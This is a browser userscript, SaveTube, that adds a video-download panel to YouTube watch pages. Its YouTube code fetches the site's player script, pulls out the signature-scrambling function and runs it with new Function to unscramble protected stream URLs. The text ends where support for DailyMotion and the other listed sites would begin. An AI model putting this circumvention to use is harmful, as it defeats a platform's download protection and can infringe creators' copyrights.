// ==UserScript==
// @name		Save Video from ANY Streaming Websites
// @version		5.7.2
// @description		Download videos from video streaming web sites such as Youtube,Metacafe etc.
// @author		    http://userscripts.org/users/TMKC
// @namespace		https://userscripts.org/users/TMKC
// @downloadURL		https://userscripts.org/scripts/source/300298.user.js
// @updateURL		https://userscripts.org/scripts/source/300298.meta.js
// @icon		
// @include		http://youtube.com*
// @include		http://www.youtube.com*
// @include		https://youtube.com*
// @include		https://www.youtube.com*
// @include		http://dailymotion.com*
// @include		http://www.dailymotion.com*
// @include		https://dailymotion.com*
// @include		https://www.dailymotion.com*
// @include		http://vimeo.com*
// @include		http://www.vimeo.com*
// @include		https://vimeo.com*
// @include		https://www.vimeo.com*
// @include		http://metacafe.com*
// @include		http://www.metacafe.com*
// @include		https://metacafe.com*
// @include		https://www.metacafe.com*
// @include		http://break.com*
// @include		http://www.break.com*
// @include		https://break.com*
// @include		https://www.break.com*
// @include		http://funnyordie.com*
// @include		http://www.funnyordie.com*
// @include		https://funnyordie.com*
// @include		https://www.funnyordie.com*
// @include		http://videojug.com*
// @include		http://www.videojug.com*
// @include		https://videojug.com*
// @include		https://www.videojug.com*
// @include		http://mevio.com*
// @include		http://*.mevio.com*
// @include		https://mevio.com*
// @include		https://*.mevio.com*
// @include		http://blip.tv*
// @include		http://www.blip.tv*
// @include		https://blip.tv*
// @include		https://www.blip.tv*
// @include		http://veoh.com*
// @include		http://www.veoh.com*
// @include		https://veoh.com*
// @include		https://www.veoh.com*
// @include		http://crackle.com*
// @include		http://www.crackle.com*
// @include		https://crackle.com*
// @include		https://www.crackle.com*
// @include	    http://facebook.com/*
// @include	    http://*.facebook.com/*
// @include	    https://facebook.com/*
// @include	    https://*.facebook.com/*
// @require     http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.js
// @grant		GM_xmlhttpRequest
// ==/UserScript==


/*
  
    Not To Re-Upload or Re-Edit Or Re-Distribute.
	For This Contact Me: https://www.facebook.com/mohitsahoo.dugu
	
	Share It.Like Us On Facebook:- https://www.facebook.com/Xpert.Editing
    More Scripts Coming Soon...
    Follow This For More Followers:- https://www.facebook.com/lists/482946545147084
  
*/


(function() {


// Don't run on frames or iframes
if (window.top != window.self) return;


// ==========Variables========== //

// Userscript
var userscript = 'SaveTube';

// Page
var page = {win: window, doc: document, body: document.body, url: window.location.href};

// Saver
var saver = {};
var feature = {'definition': true, 'container': true, 'autoget': false};
var option = {'definition': 'HD', 'container': 'MP4', 'autoget': false};

// Links
var website = 'http://isebaro.com/savetube/?ln=en';
var contact = 'http://isebaro.com/contact/?ln=en&sb=savetube';


// ==========Functions========== //

function createMyElement (type, content, event, action, target) {
  var obj = page.doc.createElement(type);
  if (content) {
    if (type == 'div') obj.innerHTML = content;
    else if (type == 'option') {
      obj.value = content;
      obj.innerHTML = content;
    }
  }
  if (event == 'change') {
    if (target == 'video') {
      obj.addEventListener ('change', function () {
	saver['videoSave'] = this.value;
	if (feature['autoget']) {
	  if (option['autoget']) getMyVideo();
	}
	else {
	  modifyMyElement (saver['buttonGet'] , 'div', 'Get', false);
	}
      }, false);
    }
  }
  else if (event == 'click') {
    obj.addEventListener ('click', function () {
      if (action == 'close') {
	removeMyElement(page.body, target);
      }
      else if (action == 'logo') {
	page.win.location.href = website;
      }
      else if (action == 'get') {
	getMyVideo();
      }
      else if (action == 'autoget') {
	option['autoget'] = (option['autoget']) ? false : true;
	if (option['autoget']) {
	  styleMyElement (saver['buttonGet'], {display: 'none'});
	  styleMyElement (saver['buttonAutoget'], {color: '#008080', textShadow: '0px 1px 1px #CCCCCC'});
	  getMyVideo();
	}
	else {
	  styleMyElement (saver['buttonGet'], {display: 'inline'});
	  styleMyElement (saver['buttonAutoget'], {color: '#CCCCCC', textShadow: '0px 0px 0px'});
	}
	setMyOptions ('savetube_autoget', option['autoget']);
      }
      else if (action == 'definition') {
	for (var itemDef = 0; itemDef < option['definitions'].length; itemDef++) {
	  if (option['definitions'][itemDef].match(/[A-Z]/g).join('') == option['definition']) {
	    var nextDef = (itemDef + 1 < option['definitions'].length) ? itemDef + 1 : 0;
	    option['definition'] = option['definitions'][nextDef].match(/[A-Z]/g).join('');
	    break;
	  }
	}
	modifyMyElement (saver['buttonDefinition'], 'div', option['definition'], false);
	setMyOptions ('savetube_definition', option['definition']);
	modifyMyElement (saver['buttonGet'] , 'div', 'Get', false);
	selectMyVideo ();
	if (option['autoget']) getMyVideo();
      }
      else if (action == 'container') {
	for (var itemCont = 0; itemCont < option['containers'].length; itemCont++) {
	  if (option['containers'][itemCont] == option['container']) {
	    var nextCont = (itemCont + 1 < option['containers'].length) ? itemCont + 1 : 0;
	    option['container'] = option['containers'][nextCont];
	    break;
	  }
	}
	modifyMyElement (saver['buttonContainer'], 'div', option['container'], false);
	setMyOptions ('savetube_container', option['container']);
	modifyMyElement (saver['buttonGet'] , 'div', 'Get', false);
	selectMyVideo ();
	if (option['autoget']) getMyVideo();
      }
    }, false);
  }
  return obj;
}

function getMyElement (obj, type, from, value, child, content) {
  var getObj, chObj, coObj;
  var pObj = (!obj) ? page.doc : obj;
  if (type == 'body') getObj = pObj.body;
  else {
    if (from == 'id') getObj = pObj.getElementById(value);
    else if (from == 'class') getObj = pObj.getElementsByClassName(value);
    else if (from == 'tag') getObj = pObj.getElementsByTagName(type);
    else if (from == 'ns') getObj = pObj.getElementsByTagNameNS(value, type);
  }
  chObj = (child >= 0) ? getObj[child] : getObj;
  if (content && chObj) {
    if (type == 'html' || type == 'body' || type == 'div' || type == 'option') coObj = chObj.innerHTML;
    else if (type == 'object') coObj = chObj.data;
    else coObj = chObj.textContent;
    return coObj;
  }
  else {
    return chObj;
  }
}

function modifyMyElement (obj, type, content, clear) {
  if (content) {
    if (type == 'div') obj.innerHTML = content;
    else if (type == 'option') {
      obj.value = content;
      obj.innerHTML = content;
    }
  }
  if (clear) {
    if (obj.hasChildNodes()) {
      while (obj.childNodes.length >= 1) {
        obj.removeChild(obj.firstChild);
      }
    }
  }
}

function styleMyElement (obj, styles) {
  for (var property in styles) {
    if (styles.hasOwnProperty(property)) obj.style[property] = styles[property];
  }
}

function appendMyElement (parent, child) {
  parent.appendChild(child);
}

function removeMyElement (parent, child) {
  parent.removeChild(child);
}

function replaceMyElement (parent, orphan, child) {
  parent.replaceChild(orphan, child);
}

function createMySaver () {
  /* Get My Options */
  getMyOptions ();
  
  /* Saver Settings */
  saver['panelHeight'] = 18;
  saver['panelPadding'] = 2;

  /* The Panel */
  var panelWidth = saver['saverWidth'] - saver['panelPadding'] * 2;
  saver['saverPanel'] = createMyElement ('div', '', '', '', '');
  styleMyElement (saver['saverPanel'], {position: 'relative', width: panelWidth + 'px', height: saver['panelHeight'] + 'px', display: 'block', padding: saver['panelPadding'] + 'px', backgroundColor: '#F4F4F4', fontSize: '12px', textAlign: 'center', zIndex: '99999'});
  appendMyElement (saver['saverSocket'], saver['saverPanel']);

  /* Warnings */
  if (saver['warnMess']) {
    if (saver['warnContent']) showMyMessage (saver['warnMess'], saver['warnContent']);
    else showMyMessage (saver['warnMess']);
    return;
  }
  
  /* Panel Items */
  var panelItemBorder = 1;
  var panelItemHeight = saver['panelHeight'] - panelItemBorder * 2;
  
  /* Panel Logo */
  saver['panelLogo'] = createMyElement ('div', userscript + ':', 'click', 'logo', '');
  styleMyElement (saver['panelLogo'], {height: panelItemHeight + 'px', border: '1px solid #F4F4F4', borderRadius: '3px', padding: '0px', display: 'inline', color: '#336699', fontSize: '12px', textShadow: '0px 1px 1px #CCCCCC', cursor: 'pointer'});
  appendMyElement (saver['saverPanel'], saver['panelLogo']);

  /* Panel Video Menu */
  saver['videoMenu'] = createMyElement ('select', '', 'change', '', 'video');
  styleMyElement (saver['videoMenu'], {width: '200px', height: panelItemHeight + 'px', border: '1px solid #F4F4F4', borderRadius: '3px', padding: '0px', display: 'inline', backgroundColor: '#F4F4F4', color: '#336699', fontSize: '12px', textShadow: '0px 1px 1px #CCCCCC', verticalAlign: 'baseline', cursor: 'pointer'});
  appendMyElement (saver['saverPanel'], saver['videoMenu'] );
  for (var videoCode in saver['videoList']) {
    saver['videoItem'] = createMyElement ('option', videoCode, '', '', '');
    styleMyElement (saver['videoItem'], {padding: '0px', display: 'block', backgroundColor: '#F4F4F4', color: '#336699', fontSize: '12px', textShadow: '0px 1px 1px #CCCCCC', cursor: 'pointer'});
    appendMyElement (saver['videoMenu'], saver['videoItem']);
  }

  /* Panel Get Button */
  saver['buttonGet'] = createMyElement ('div', 'Get', 'click', 'get', '');
  styleMyElement (saver['buttonGet'], {height: panelItemHeight + 'px', border: '1px solid #CCCCCC', borderRadius: '3px', padding: '0px 5px', display: 'inline', color: '#C000C0', fontSize: '12px', textShadow: '0px 1px 1px #CCCCCC', cursor: 'pointer'});
  if (option['autoget']) styleMyElement (saver['buttonGet'], {display: 'none'});
  appendMyElement (saver['saverPanel'], saver['buttonGet']);

  /* Panel Autoget Button */
  if (feature['autoget']) {
    saver['buttonAutoget'] = createMyElement ('div', 'Autoget', 'click', 'autoget', '');
    styleMyElement (saver['buttonAutoget'], {height: panelItemHeight + 'px', border: '1px solid #CCCCCC', borderRadius: '3px', padding: '0px 5px', display: 'inline', color: '#CCCCCC', fontSize: '12px', cursor: 'pointer'});
    if (option['autoget']) styleMyElement (saver['buttonAutoget'], {color: '#008080', textShadow: '0px 1px 1px #CCCCCC'});
    appendMyElement (saver['saverPanel'], saver['buttonAutoget']);
  }

  /* Panel Definition Button */
  if (feature['definition']) {
    saver['buttonDefinition'] = createMyElement ('div', option['definition'], 'click', 'definition', '');
    styleMyElement (saver['buttonDefinition'], {height: panelItemHeight + 'px', border: '1px solid #CCCCCC', borderRadius: '3px', padding: '0px 5px', display: 'inline', color: '#008000', fontSize: '12px', textShadow: '0px 1px 1px #CCCCCC', cursor: 'pointer'});
    appendMyElement (saver['saverPanel'], saver['buttonDefinition']);
  }

  /* Panel Container Button */
  if (feature['container']) {
    saver['buttonContainer'] = createMyElement ('div', option['container'], 'click', 'container', '');
    styleMyElement (saver['buttonContainer'], {height: panelItemHeight + 'px', border: '1px solid #CCCCCC', borderRadius: '3px', padding: '0px 5px', display: 'inline', color: '#008000', fontSize: '12px', textShadow: '0px 1px 1px #CCCCCC', cursor: 'pointer'});
    appendMyElement (saver['saverPanel'], saver['buttonContainer']);
  }

  /* Select The Video */
  if (feature['definition'] || feature['container']) selectMyVideo ();
 
 /* Get The Video On Autoget */
 if (option['autoget']) getMyVideo();
}

function selectMyVideo () {
  var vdoCont = (option['container'] != 'Any') ? [option['container']] : option['containers'];
  var vdoDef = option['definitions'];
  var vdoList = {};
  for (var vC = 0; vC < vdoCont.length; vC++) {
    if (vdoCont[vC] != 'Any') {
      for (var vD = 0; vD < vdoDef.length; vD++) {
	var format = vdoDef[vD] + ' ' + vdoCont[vC];
	if (!vdoList[vdoDef[vD]]) {
	  for (var vL in saver['videoList']) {
	    if (vL == format) {
	      vdoList[vdoDef[vD]] = vL;
	      break;
	    }
	  }
	}
      }
    }
  }
  if (option['definition'] == 'UHD') {
    if (vdoList['Ultra High Definition']) saver['videoSave'] = vdoList['Ultra High Definition'];
    else if (vdoList['Full High Definition']) saver['videoSave'] = vdoList['Full High Definition'];
    else if (vdoList['High Definition']) saver['videoSave'] = vdoList['High Definition'];
    else if (vdoList['Standard Definition']) saver['videoSave'] = vdoList['Standard Definition'];
    else if (vdoList['Low Definition']) saver['videoSave'] = vdoList['Low Definition'];
    else if (vdoList['Very Low Definition']) saver['videoSave'] = vdoList['Very Low Definition'];
  }
  else if (option['definition'] == 'FHD') {
    if (vdoList['Full High Definition']) saver['videoSave'] = vdoList['Full High Definition'];
    else if (vdoList['High Definition']) saver['videoSave'] = vdoList['High Definition'];
    else if (vdoList['Standard Definition']) saver['videoSave'] = vdoList['Standard Definition'];
    else if (vdoList['Low Definition']) saver['videoSave'] = vdoList['Low Definition'];
    else if (vdoList['Very Low Definition']) saver['videoSave'] = vdoList['Very Low Definition'];
  }
  else if (option['definition'] == 'HD') {
    if (vdoList['High Definition']) saver['videoSave'] = vdoList['High Definition'];
    else if (vdoList['Standard Definition']) saver['videoSave'] = vdoList['Standard Definition'];
    else if (vdoList['Low Definition']) saver['videoSave'] = vdoList['Low Definition'];
    else if (vdoList['Very Low Definition']) saver['videoSave'] = vdoList['Very Low Definition'];
  }
  else if (option['definition'] == 'SD') {
    if (vdoList['Standard Definition']) saver['videoSave'] = vdoList['Standard Definition'];
    else if (vdoList['Low Definition']) saver['videoSave'] = vdoList['Low Definition'];
    else if (vdoList['Very Low Definition']) saver['videoSave'] = vdoList['Very Low Definition'];
  }
  else if (option['definition'] == 'LD') {
    if (vdoList['Low Definition']) saver['videoSave'] = vdoList['Low Definition'];
    else if (vdoList['Very Low Definition']) saver['videoSave'] = vdoList['Very Low Definition'];
  }
  else if (option['definition'] == 'VLD') {
    if (vdoList['Very Low Definition']) saver['videoSave'] = vdoList['Very Low Definition'];
    else if (vdoList['Low Definition']) saver['videoSave'] = vdoList['Low Definition'];
  }
  saver['videoMenu'].value = saver['videoSave'];
}

function getMyVideo () {
  var vdoURL = saver['videoList'][saver['videoSave']];
  if (saver['videoTitle']) {
    var vdoD = ' (' + saver['videoSave'] + ')';
    vdoD = vdoD.replace(/Ultra High Definition/, 'UHD');
    vdoD = vdoD.replace(/Full High Definition/, 'FHD');
    vdoD = vdoD.replace(/High Definition/, 'HD');
    vdoD = vdoD.replace(/Standard Definition/, 'SD');
    vdoD = vdoD.replace(/Very Low Definition/, 'VLD');
    vdoD = vdoD.replace(/Low Definition/, 'LD');
    vdoD = vdoD.replace(/\sFLV|\sMP4|\sWebM|\s3GP/g, '');
    vdoURL = vdoURL + '&title=' + saver['videoTitle'] + vdoD;
  }
  if (feature['autoget']) page.win.location.href = vdoURL;
  else {
    var vdoLink = 'Get <a href="' + vdoURL + '">Link</a>';
    modifyMyElement (saver['buttonGet'] , 'div', vdoLink, false);
  }
}

function cleanMyContent (content, unesc) {
  var myNewContent = content;
  if (unesc) myNewContent = unescape (myNewContent);
  myNewContent = myNewContent.replace (/\\u0025/g,'%');
  myNewContent = myNewContent.replace (/\\u0026/g,'&');
  myNewContent = myNewContent.replace (/\\/g,'');
  myNewContent = myNewContent.replace (/\n/g,'');
  return myNewContent;
}

function getMyContent (url, pattern, clean) {
  var myPageContent, myVideosParse, myVideosContent;
  var isIE = (navigator.appName.indexOf('Internet Explorer') != -1) ? true : false;
  var getMethod = (url != page.url || isIE) ? 'XHR' : 'DOM';
  if (getMethod == 'DOM') {
    myPageContent = getMyElement ('', 'html', 'tag', '', 0, true);
    if (!myPageContent) myPageContent = getMyElement ('', 'body', '', '', -1, true);
    if (clean) myPageContent = cleanMyContent (myPageContent, true);
    myVideosParse = myPageContent.match (pattern);
    myVideosContent = (myVideosParse) ? myVideosParse[1] : null;
    if (myVideosContent) return myVideosContent;
    else getMethod = 'XHR';
  }
  if (getMethod == 'XHR') {
    var xmlHTTP = new XMLHttpRequest();
    xmlHTTP.open('GET', url, false);
    xmlHTTP.send();
    if (pattern == 'XML') {
      myVideosContent = xmlHTTP.responseXML;
    }
    else if (pattern == 'TEXT') {
      myVideosContent = xmlHTTP.responseText;
    }
    else {
      myPageContent = xmlHTTP.responseText;
      if (clean) myPageContent = cleanMyContent (myPageContent, true);
      myVideosParse = myPageContent.match (pattern);
      myVideosContent = (myVideosParse) ? myVideosParse[1] : null;
    }
    return myVideosContent;
  }
}

function setMyOptions (key, value) {
  try {
    localStorage.setItem(key, value);
  }
  catch(e) {
    var date = new Date();
    date.setTime(date.getTime() + (356*24*60*60*1000));
    var expires = '; expires=' + date.toGMTString();
    page.doc.cookie = key + '=' + value + expires + '; path=/';
  }
}

function getMyOptions () {
  var stAutoget = 'savetube_autoget';
  var stDefinition = 'savetube_definition';
  var stContainer = 'savetube_container';
  try {
    if (localStorage.getItem(stAutoget)) option['autoget'] = localStorage.getItem(stAutoget);
    if (localStorage.getItem(stDefinition)) option['definition'] = localStorage.getItem(stDefinition);
    if (localStorage.getItem(stContainer)) option['container'] = localStorage.getItem(stContainer);
  }
  catch(e) {
    var cookies = page.doc.cookie.split(';');
    for (var i=0; i < cookies.length; i++) {
      var cookie = cookies[i];
      while (cookie.charAt(0) == ' ') cookie = cookie.substring(1, cookie.length);
      if (cookie.indexOf(stAutoget) == 0) option['autoget'] = cookie.substring(stAutoget.length + 1, cookie.length);
      if (cookie.indexOf(stDefinition) == 0) option['definition'] = cookie.substring(stDefinition.length + 1, cookie.length);
      if (cookie.indexOf(stContainer) == 0) option['container'] = cookie.substring(stContainer.length + 1, cookie.length);
    }
  }
  option['autoget'] = (option['autoget'] == 'true') ? true : false;
}

function showMyMessage (cause, content) {
  var myScriptLogo = createMyElement ('div', userscript, '', '', '');
  styleMyElement (myScriptLogo, {margin: '0px auto', padding: '10px', color: '#666666', fontSize: '24px', textAlign: 'center', textShadow: '#FFFFFF -1px -1px 2px'});
  var myScriptMess = createMyElement ('div', '', '', '', '');
  styleMyElement (myScriptMess, {border: '1px solid #F4F4F4', margin: '5px auto 5px auto', padding: '10px', backgroundColor: '#FFFFFF', color: '#AD0000', textAlign: 'center'});
  if (cause == '!player') {
    var myScriptAlert = createMyElement ('div', '', '', '', '');
    styleMyElement (myScriptAlert, {position: 'absolute', top: '30%', left: '35%', border: '1px solid #F4F4F4', borderRadius: '3px', padding: '10px', backgroundColor: '#F8F8F8', fontSize: '14px', textAlign: 'center', zIndex: '99999'});
    appendMyElement (myScriptAlert, myScriptLogo);
    var myNoPlayerMess = 'Couldn\'t get the player element. Please report it <a href="' + contact + '">here</a>.';
    modifyMyElement (myScriptMess, 'div', myNoPlayerMess, false);
    appendMyElement (myScriptAlert, myScriptMess);
    var myScriptAlertButton = createMyElement ('div', 'OK', 'click', 'close', myScriptAlert);
    styleMyElement (myScriptAlertButton, {width: '100px', border: '3px solid #EEEEEE', borderRadius: '5px', margin: '0px auto', backgroundColor: '#EEEEEE', color: '#666666', fontSize: '18px', textAlign: 'center', textShadow: '#FFFFFF -1px -1px 2px', cursor: 'pointer'});
    appendMyElement (myScriptAlert, myScriptAlertButton);
    appendMyElement (page.body, myScriptAlert);
  }
  else {
    styleMyElement (saver['saverPanel'], {color: '#AD0000'});
    if (cause == '!content') {
      var myNoContentMess = '<b>SaveTube:</b> Couldn\'t get the videos content. Please report it <a href="' + contact + '">here</a>.';
      modifyMyElement (saver['saverPanel'], 'div', myNoContentMess, false);
    }
    else if (cause == '!videos') {
      var myNoVideosMess = '<b>SaveTube:</b> Couldn\'t get any video. Please report it <a href="' + contact + '">here</a>.';
      modifyMyElement (saver['saverPanel'], 'div', myNoVideosMess, false);
    }
    else if (cause == '!support') {
      var myNoSupportMess = '<b>SaveTube:</b> This video uses the RTMP protocol which is not supported.';
      modifyMyElement (saver['saverPanel'], 'div', myNoSupportMess, false);
    }
    else if (cause == 'embed') {
      var myEmbedMess = '<b>SaveTube:</b> This is an embedded video. You can get it <a href="' + content + '">here</a>.';
      modifyMyElement (saver['saverPanel'], 'div', myEmbedMess, false);
    }
  }
}


// ==========Websites========== //

// Force page reload on href change
page.win.setInterval(function() {
  nurl = page.win.location.href;
  if (page.url != nurl) {
    // YouTube
    if (nurl.indexOf('youtube.com') != -1) {
      if (nurl.indexOf('youtube.com/watch') != -1) page.win.location.href = nurl;
    }
    // Others
    else {
      page.win.location.href = nurl;
    }
  }
}, 500);

// =====YouTube===== //

if (page.url.indexOf('youtube.com/watch') != -1) {
  
  /* Decrypt Signature */
  var ytDecrypter = null;
  var ytDecryptFunction = null;
  function decryptSignature(s) {
    if (typeof ytDecrypter === 'function') {
      return ytDecrypter(s);
    }
    else {
      if (!ytDecryptFunction) ytDecryptFunction = 'a=a.split("");a=a.slice(3);a=Vy(a,2);a=Vy(a,59);a=a.slice(2);a=Vy(a,68);a=a.reverse();a=a.slice(3);a=a.reverse();a=a.slice(1);return a.join("")';
      var ytFncSwap = ytDecryptFunction.match(/\w=(\w+)\(\w,[0-9]+\)/);
      ytFncSwap = (ytFncSwap) ? ytFncSwap[1] : null;
      if (ytFncSwap) {
	var ytFncBody = 'function ' + ytFncSwap + '(a, b)' + '{var c=a[0];a[0]=a[b%a.length];a[b]=c;return a} ' + ytDecryptFunction;
	ytDecrypter = new Function('a', ytFncBody);
	return ytDecrypter(s);
      }
    }
    return null;
  }

  /* Get Player Window */
  var ytFeatherBeta;
  var ytPlayerWindow = getMyElement ('', 'div', 'id', 'player', -1, false);
  if (!ytPlayerWindow) {
    ytPlayerWindow = getMyElement ('', 'div', 'id', 'p', -1, false);
    if (ytPlayerWindow) styleMyElement (ytPlayerWindow, {margin: '0px 0px 30px 0px'});
    ytFeatherBeta = true;
  }

  if (!ytPlayerWindow) {
    showMyMessage ('!player');
  }
  else {
    /* Get Video Title */
    if (ytFeatherBeta) {
      var ytVideoTitle = page.doc.title;
    }
    else {
      var ytVideoTitle = getMyContent (page.url, 'meta\\s+itemprop="name"\\s+content="(.*?)"', false);
      if (!ytVideoTitle) ytVideoTitle = getMyContent (page.url, 'meta\\s+property="og:title"\\s+content="(.*?)"', false);
      if (!ytVideoTitle) ytVideoTitle = page.doc.title;
    }
    if (ytVideoTitle) {
      ytVideoTitle = ytVideoTitle.replace(/&quot;/g, '\'').replace(/&#34;/g, '\'').replace(/"/g, '\'');
      ytVideoTitle = ytVideoTitle.replace(/&#39;/g, '\'').replace(/'/g, '\'');
      ytVideoTitle = ytVideoTitle.replace(/&amp;/g, 'and').replace(/&/g, 'and');
      ytVideoTitle = ytVideoTitle.replace(/\?/g, '').replace(/[#:\*]/g, '-').replace(/\//g, '-');
      ytVideoTitle = ytVideoTitle.replace(/^\s+|\s+$/, '').replace(/\.+$/g, '');
      ytVideoTitle = ytVideoTitle.replace(/^YouTube\s-\s/, '');
    }

    /* Get Videos Content */
    var ytVideosContent;
    var ytVideosEncodedFmts, ytVideosAdaptiveFmts;
    ytVideosEncodedFmts = getMyContent(page.url, '"url_encoded_fmt_stream_map":\\s+"(.*?)"', false);
    if (ytVideosEncodedFmts) ytVideosEncodedFmts = cleanMyContent(ytVideosEncodedFmts, false);
    else {
      ytVideosEncodedFmts = getMyContent(page.url, 'url_encoded_fmt_stream_map=(.*?)&amp;', false);
      if (ytVideosEncodedFmts) ytVideosEncodedFmts = cleanMyContent(ytVideosEncodedFmts, true);
    }
    ytVideosAdaptiveFmts = getMyContent(page.url, '"adaptive_fmts":\\s+"(.*?)"', false);
    if (ytVideosAdaptiveFmts) ytVideosAdaptiveFmts = cleanMyContent(ytVideosAdaptiveFmts, false);
    else {
      ytVideosAdaptiveFmts = getMyContent(page.url, 'adaptive_fmts=(.*?)&amp;', false);
      if (ytVideosAdaptiveFmts) ytVideosAdaptiveFmts = cleanMyContent(ytVideosAdaptiveFmts, true);
    }
    if (ytVideosEncodedFmts) {
      ytVideosContent = ytVideosEncodedFmts;
    }
    if (ytVideosAdaptiveFmts) {
      if (ytVideosContent) ytVideosContent += ',' + ytVideosAdaptiveFmts;
      else ytVideosContent = ytVideosAdaptiveFmts;
    }

    /* Parse Videos */
    function ytVideos() {
      var ytVideoFormats = {
	'5': 'Very Low Definition FLV',
	'17': 'Very Low Definition 3GP',
	'18': 'Low Definition MP4',
	'22': 'High Definition MP4',
	'34': 'Low Definition FLV',
	'35': 'Standard Definition FLV',
	'36': 'Low Definition 3GP',
	'37': 'Full High Definition MP4',
	'38': 'Ultra High Definition MP4',
	'43': 'Low Definition WebM',
	'44': 'Standard Definition WebM',
	'45': 'High Definition WebM',
	'46': 'Full High Definition WebM',
	'82': 'Low Definition 3D MP4',
	'83': 'Standard Definition 3D MP4',
	'84': 'High Definition 3D MP4',
	'85': 'Full High Definition 3D MP4',
	'100': 'Low Definition 3D WebM',
	'101': 'Standard Definition 3D WebM',
	'102': 'High Definition 3D WebM',
	'135': 'Standard Definition Video MP4',
	'136': 'High Definition Video MP4',
	'137': 'Full High Definition Video MP4',
	'138': 'Ultra High Definition Video MP4',
	'139': 'Low Bitrate Audio MP4',
	'140': 'Medium Bitrate Audio MP4',
	'141': 'High Bitrate Audio MP4',
	'171': 'Medium Bitrate Audio WebM',
	'172': 'High Bitrate Audio WebM'
      };
      var ytVideoFound = false;
      var ytVideos = ytVideosContent.split(',');
      var ytVideoParse, ytVideoCodeParse, ytVideoCode, myVideoCode, ytVideo;
      for (var i = 0; i < ytVideos.length; i++) {
	if (!ytVideos[i].match(/^url/)) {
	  ytVideoParse = ytVideos[i].match(/(.*)(url=.*$)/);
	  if (ytVideoParse) ytVideos[i] = ytVideoParse[2] + '&' + ytVideoParse[1];
	}
	ytVideoCodeParse = ytVideos[i].match (/itag=(\d{1,3})/);
	ytVideoCode = (ytVideoCodeParse) ? ytVideoCodeParse[1] : null;
	if (ytVideoCode) {
	  myVideoCode = ytVideoFormats[ytVideoCode];
	  if (myVideoCode) {
	    ytVideo = ytVideos[i].replace (/url=/, '').replace(/&$/, '').replace(/&itag=\d{1,3}/, '');
	    if (ytVideo.match(/type=.*?&/)) ytVideo = ytVideo.replace(/type=.*?&/, '');
	    else ytVideo = ytVideo.replace(/&type=.*$/, '');
	    if (ytVideo.match(/&sig=/)) ytVideo = ytVideo.replace (/&sig=/, '&signature=');
	    else if (ytVideo.match(/&s=/)) {
	      var ytSig = ytVideo.match(/&s=(.*?)(&|$)/);
	      if (ytSig) {
		var s = ytSig[1];
		s = decryptSignature(s);
		if (s) ytVideo = ytVideo.replace(/&s=.*?(&|$)/, '&signature=' + s + '$1');
		else ytVideo = '';
	      }
	      else ytVideo = '';
	    }
	    ytVideo = cleanMyContent (ytVideo, true);
	    if (ytVideo && ytVideo.indexOf('http') == 0) {
	      if (!ytVideoFound) ytVideoFound = true;
	      ytVideoList[myVideoCode] = ytVideo;
	    }
	  }
	}
      }
      
      if (ytVideoFound) {
	/* Create Saver */
	var ytDefaultVideo = 'Low Definition MP4';
	saver = {'saverSocket': ytPlayerWindow, 'videoList': ytVideoList, 'videoSave': ytDefaultVideo, 'videoTitle': ytVideoTitle, 'saverWidth': 640};
	feature['autoget'] = true;
	option['definitions'] = ['Ultra High Definition', 'Full High Definition', 'High Definition', 'Standard Definition', 'Low Definition', 'Very Low Definition'];
	option['containers'] = ['MP4', 'WebM', 'FLV', '3GP', 'Any'];
	createMySaver ();
      }
      else {
	saver = {'saverSocket': ytPlayerWindow, 'saverWidth': 640};
	if (ytVideosContent.indexOf('conn=rtmp') != -1) saver['warnMess'] = '!support';
	else saver['warnMess'] = '!videos';
	createMySaver ();
      }
    }
    
    /* Parse HLS */
    function ytHLS(ytHLSVideos) {
      var ytHLSFormats = {
	'92': 'Very Low Definition MP4',
	'93': 'Low Definition MP4',
	'94': 'Standard Definition MP4',
	'95': 'High Definition MP4'
      };
      ytVideoList["Any Definition MP4"] = ytHLSVideos;
      var ytHLSContent = getMyContent(ytHLSVideos, 'TEXT', false);
      if (ytHLSContent) {
	var ytHLSMatcher = new RegExp('(http.*?m3u8)', 'g');
	ytHLSVideos = ytHLSContent.match(ytHLSMatcher);
	var ytHLSVideo, ytVideoCodeParse, ytVideoCode, myVideoCode;
	if (ytHLSVideos) {
	  for (var i = 0; i < ytHLSVideos.length; i++) {
	    ytHLSVideo = ytHLSVideos[i];
	    ytVideoCodeParse = ytHLSVideo.match(/\/itag\/(\d{1,3})\//);
	    ytVideoCode = (ytVideoCodeParse) ? ytVideoCodeParse[1] : null;
	    if (ytVideoCode) {
	      myVideoCode = ytHLSFormats[ytVideoCode];
	      if (myVideoCode) {
		ytVideoList[myVideoCode] = ytHLSVideo;
	      }
	    }
	  }
	}
      }

      /* Create Saver */
      ytVideoTitle = null;   
      var ytDefaultVideo = 'Low Definition MP4';
      saver = {'saverSocket': ytPlayerWindow, 'videoList': ytVideoList, 'videoSave': ytDefaultVideo, 'videoTitle': ytVideoTitle, 'saverWidth': 640};
      option['definitions'] = ['High Definition', 'Standard Definition', 'Low Definition', 'Very Low Definition'];
      option['containers'] = ['MP4'];
      createMySaver ();
    }

    /* Get Videos */
    var ytVideoList = {};    
    if (ytVideosContent) {
      if (ytVideosContent.match(/&s=/)) {
	var ytFncBody;
	var ytHost = page.url.replace(/\/\/.*/, '');
	var ytScriptURL = getMyContent(page.url, "\"js\":\\s*\"(.*?)\"", true);
	if (ytScriptURL) {
	  ytScriptURL = ytHost + ytScriptURL;
	  try {
	    GM_xmlhttpRequest({
	      method: 'GET',
	      url: ytScriptURL,
	      onload: function(response) {
		if (response.readyState === 4 && response.status === 200) {
		  var ytScriptSrc = response.responseText;
		  var ytFncName = ytScriptSrc.match(/\.signature\s*=\s*(\w+)\(\w+\)/);
		  ytFncName = (ytFncName) ? ytFncName[1] : null;
		  if (ytFncName) {
		    var ytFncMatch = 'function ' + ytFncName + '\\s*\\(\\w+\\)\\s*\\{(.*?)\\}';
		    var ytFncBody = ytScriptSrc.match(ytFncMatch);
		    ytDecryptFunction = (ytFncBody) ? ytFncBody[1] : null;
		  }
		}
		ytVideos();    
	      }});
	  }
	  catch (e) {
	    ytVideos();
	  }
	}
	else {
	  ytVideos();
	}
      }
      else {
	ytVideos();
      }   
    }
    else {
      var ytHLSVideos = getMyContent(page.url, '"hlsvp":\\s*"(.*?)"', false);
      if (ytHLSVideos) {
	ytHLSVideos = cleanMyContent(ytHLSVideos, false);
	ytHLS(ytHLSVideos);
      }
      else {
	var ytVideoAvailable = getMyElement ('', 'div', 'id', 'player-unavailable', -1, false);
	if (ytVideoAvailable && ytVideoAvailable.className.indexOf('hid') == -1) return;
	else {
	  saver = {'saverSocket': ytPlayerWindow, 'saverWidth': 640, 'warnMess': '!content'};
	  createMySaver ();
	}
      }
    }
  }

}

// =====DailyMotion===== //
